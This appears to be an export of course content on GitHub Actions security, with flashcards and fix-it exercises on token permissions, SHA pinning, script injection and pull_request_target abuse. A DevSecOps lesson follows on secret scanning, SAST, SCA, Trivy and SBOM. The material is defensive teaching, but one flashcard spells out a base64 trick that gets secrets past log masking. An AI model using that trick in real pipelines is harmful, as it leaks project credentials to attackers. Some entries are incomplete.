C10-C2.backEn: Because `pull_request_target` runs with full base-repo `secrets` and write `GITHUB_TOKEN`; checking out and executing untrusted Fork code (`npm ci`, `build`) lets attackers steal every project secret!

C10-C3.frontEn: What is the safe version-pinning rule for third-party GitHub Actions?
C10-C3.backEn: Hard-pin to the full 40-character hexadecimal Commit SHA accompanied by a human-readable version comment, e.g.: `uses: aquasecurity/trivy-action@18f2510ee396bbf400402917b394f2dd8c87dbb0 # v0.28.0`.

C10-C4.frontEn: What is the Least Privilege `GITHUB_TOKEN` permissions pattern in a Workflow file?
C10-C4.backEn: Declare `permissions: { contents: read }` at the top level of the file, and override with minimal write permissions only inside the specific jobs that need them.

C10-C5.frontEn: Which four common attacker-controlled context variables must never be interpolated directly into `run:`?

C10-C6.frontEn: If GitHub detects a value matching `secrets` printed in logs, does automatic `***` masking protect you 100%?
C10-C6.backEn: No! An attacker only needs to Base64-encode it (`echo "$SECRET" | base64`) or insert spaces between characters to immediately bypass GitHub's plain-text log masking filter!

cicd-ex-c10-1.titleEn: Revoke overly broad write-all permissions down to minimal contents: read
cicd-ex-c10-1.promptEn:
The Workflow below dangerously opens `permissions: write-all` for a job that only runs basic tests!

Replace the top-level `permissions: write-all` with an object granting only source code read access:
`permissions: { contents: read }`
hintsEn: Change `permissions: write-all` into the 2-line block:\n`permissions:`\n`  contents: read`

cicd-ex-c10-2.titleEn: Split job-level permissions: keep test read-only and grant packages: write only to push-image
cicd-ex-c10-2.promptEn:
This Workflow has two jobs: `test` (running community test code) and `push-image` (pushing images to GitHub Container Registry `ghcr.io`).

Separate permissions securely:
1. At the top-level Workflow scope: set `permissions: { contents: read }` (so the `test` job has zero package write access).
2. Inside the `push-image` job only: declare `permissions` granting `contents: read` and **`packages: write`**.
hintsEn: Note: when you override `permissions:` at a job level, GitHub clears inherited top-level permissions for that job, so inside `push-image` you need to include both `contents: read` and `packages: write`!

cicd-ex-c10-3.titleEn: Patch a GitHub Actions Script Injection RCE vulnerability
cicd-ex-c10-3.promptEn:
The `Check Conventional PR Title` step below suffers from a critical **Script Injection** vulnerability because it interpolates `${{ github.event.pull_request.title }}` directly inside a bash command!

Patch this vulnerability properly:
1. Declare an environment variable `env.PR_TITLE: ${{ github.event.pull_request.title }}` on the check step.
2. Inside `run:`, replace the `${{ ... }}` expression with the double-quoted shell variable **`"$PR_TITLE"`**.
hintsEn: Make sure to remove BOTH occurrences of `${{ github.event.pull_request.title }}` inside `run:` and replace them with `$PR_TITLE`!

cicd-ex-c10-4.titleEn: Eliminate a Pwn Request vulnerability on a Fork PR test Workflow
cicd-ex-c10-4.promptEn:
Red Alert from the Red Team: the Workflow below uses `pull_request_target` and checks out untrusted PR code to run `npm ci` and `npm test` — allowing anyone who opens a PR to steal the entire `secrets` vault!

Fix it immediately:
1. Change the trigger event from `on.pull_request_target` to the safe **`on.pull_request`** (`branches: [main]`).
2. Set `permissions: { contents: read }`.
3. On the `actions/checkout@v4` step, remove the dangerous `with.ref` override so GitHub automatically checks out the safe PR merge commit.
hintsEn: Change `pull_request_target:` to `pull_request:`, remove `pull-requests: write`, change `contents: write` to `contents: read`, and delete the `with:` block under `actions/checkout@v4`.

cicd-ex-c10-5.titleEn: Hard-pin a third-party Action to a 40-character Commit SHA to prevent tag hijacking
cicd-ex-c10-5.promptEn:
The Workflow below invokes the third-party Action `aquasecurity/trivy-action@master` using a floating branch — if that repo is compromised and the branch is repointed, every company Runner will execute malware!

Hard-pin `aquasecurity/trivy-action` to the verified 40-character Commit SHA:
`18f2510ee396bbf400402917b394f2dd8c87dbb0` *(corresponding to v0.28.0)*, and upgrade `actions/checkout@v2` to `actions/checkout@v4`.
hintsEn: Update the second `uses:` line to `uses: aquasecurity/trivy-action@18f2510ee396bbf400402917b394f2dd8c87dbb0` and the first one to `uses: actions/checkout@v4`.

C11.titleEn: 5-Layer DevSecOps: Secret Scan, SAST, SCA, Trivy, SBOM & Rootless Build (Kaniko)
C11.summaryEn: Set up a 5-layer Shift-Left security funnel (Gitleaks, Semgrep, npm audit, Trivy image CRITICAL, CycloneDX SBOM) and replace privileged Docker-in-Docker with rootless Kaniko.

steps.headingEn: Overview & Context
steps.bodyEn:
In traditional software development workflows, the Security team typically runs audits only at the final stage before release. When critical vulnerabilities or exposed API keys in Git history are discovered at the last minute, the release schedule has to be delayed for rework from scratch.

The ==DevSecOps ("Shift-Left Security")== philosophy solves this problem by integrating automated security checks (**Gitleaks**, **Semgrep**, **npm audit**, **Trivy**, **CycloneDX SBOM**) that run within the **first 3–5 minutes of every Pull Request**, helping developers detect and fix vulnerabilities while writing code—just like `ESLint` or `TypeScript`.

```visual
kind: flow
title: Hệ thống kiểm tra bảo mật DevSecOps 5 lớp tự động trên Pipeline
subtitle: Mỗi lớp kiểm tra một bề mặt tấn công độc lập — lỗ hổng vượt qua lớp trước sẽ bị phát hiện ở lớp sau

  - icon: key
    badge: Lớp 1 · Git History
    title: Secret Scanning
    desc: Gitleaks quét toàn bộ lịch sử commit (fetch-depth 0) bắt khoá lộ
    code: "gitleaks detect --redact"
    tone: amber
    edge: mã sạch khoá
  - icon: code
    badge: Lớp 2 & 3 · Code + Deps
    title: SAST & SCA
    desc: Semgrep soi code tự viết (src/) · npm audit soi thư viện bên thứ 3
    code: "semgrep ci + npm audit --omit=dev"
    tone: sky
    edge: đóng gói Rootless
  - icon: shield-alert
    badge: Lớp 4 · Container OS
    title: Image CVE Gate
    desc: Trivy chặn lỗ hổng CRITICAL đã có bản vá trong Alpine/Debian
    code: "trivy image --exit-code 1"
    tone: rose
    edge: kiểm kê & hậu kiểm
  - icon: file-code
    badge: Lớp 5 · Chuỗi cung ứng
    title: SBOM & DAST
    desc: Xuất hồ sơ nguyên liệu CycloneDX JSON & quét động điểm cuối Staging
    code: "sbom.cdx.json (CycloneDX)"
    tone: emerald
```

steps.headingEn: Defense-in-Depth Architecture for DevSecOps in CI
steps.bodyEn:
```visual

alt: "Hệ thống kiểm tra DevSecOps 5 lớp tự động gồm Gitleaks quét Secret, Semgrep SAST, npm audit SCA, Trivy quét CVE Container và hồ sơ SBOM/Cosign"
title: "Kiến trúc kiểm định DevSecOps 5 lớp (Shift-Left Security)"
subtitle: "Phối hợp 5 công cụ kiểm tra chuyên biệt cùng đóng gói Rootless để phát hiện lỗ hổng ngay từ mỗi Pull Request"
caption: "5 lớp kiểm tra độc lập từ quét khóa lịch sử Git, phân tích mã tĩnh SAST, kiểm toán gói phụ thuộc SCA, quét ảnh Trivy tới xuất hồ sơ SBOM & DAST"
callouts:
  - num: 1
    label: "Lớp 1-3: Quét Secret (Gitleaks), SAST & SCA trước khi đóng gói"
    desc: "Kiểm tra toàn bộ lịch sử commit (fetch-depth: 0) bắt khoá rò rỉ, rà lỗi bảo mật trong mã tự viết bằng Semgrep và kiểm tra gói chạy thật với npm audit."
    tone: amber
  - num: 2
    label: "Lớp 4: Cổng chặn CVE hệ điều hành Container (Trivy)"
    desc: "Quét các thư viện C dưới đáy Alpine/Debian của ảnh vừa đóng gói (không gắn docker.sock của Host) và trả mã lỗi 1 nếu phát hiện CVE nghiêm trọng."
    tone: rose
  - num: 3
    label: "Lớp 5: Xuất danh mục thành phần SBOM, Ký số & DAST"
    desc: "Sinh tệp CycloneDX JSON để truy vết nhanh khi có Zero-Day mới công bố, ký xác thực ảnh với Cosign và quét động điểm cuối Staging."
    tone: emerald
```

A modern application is composed of multiple layers (first-party source code, third-party libraries, and OS packages inside a Container Image), so no single tool can catch every risk. Below is the technical role of each inspection layer:

- **`Secret Scanning` (e.g., `Gitleaks`):** Scans the entire Git commit history to detect database passwords, API keys, or tokens accidentally committed to source control.
- **`SAST` (*Static Application Security Testing*):** Analyzes the syntax tree of first-party source code (`src/`) written by the team to detect vulnerability patterns such as SQL Injection, `eval()`, and XSS without executing the application.
- **`SCA` (*Software Composition Analysis*):** Because most runtime code comes from packages installed via `npm`, `PyPI`, or `Go Modules`, `SCA` (`npm audit`, `pip-audit`, `Trivy fs`) checks lockfiles against public vulnerability databases (**CVE — Common Vulnerabilities and Exposures**).
- **`Container Image Scan` (e.g., `Trivy image`):** Inspects Linux OS packages (`Alpine`, `Debian` such as `openssl`, `libcrypto`, `curl`) bundled inside the Docker Image.
- **`SBOM` (*Software Bill of Materials*):** Exports a standardized JSON file (`CycloneDX` / `SPDX`) listing every library, OS package, and version included in a release.

*(This multi-layered defense model is often compared to the **"Swiss Cheese Model"**: each tool may have its own blind spots, but when multiple independent layers are stacked, a vulnerability that slips through one layer is caught by the next. Likewise, the `SBOM` acts like an ingredient label on a product, enabling the Security team to look up which services are affected immediately when a new Zero-day vulnerability such as *Log4Shell* or *xz-utils* is disclosed—without having to re-scan every image).*

```visual

        tone: cyan

  - title: Các Lớp Kiểm Định Thành Phẩm & Vận Hành (Artifact & Runtime)
    badge: Lớp 4 → Lớp 5 (+ DAST) · Chốt chặn trước Production

      - label: "Lớp 4 — Container Image CVE Gate (Trivy image / Grype)"
        sub: "Kiểm tra các gói hệ điều hành Alpine/Debian (openssl, libcrypto, curl) trong Image"

      - label: "Lớp 5 — Danh mục thành phần SBOM (CycloneDX / SPDX)"
```
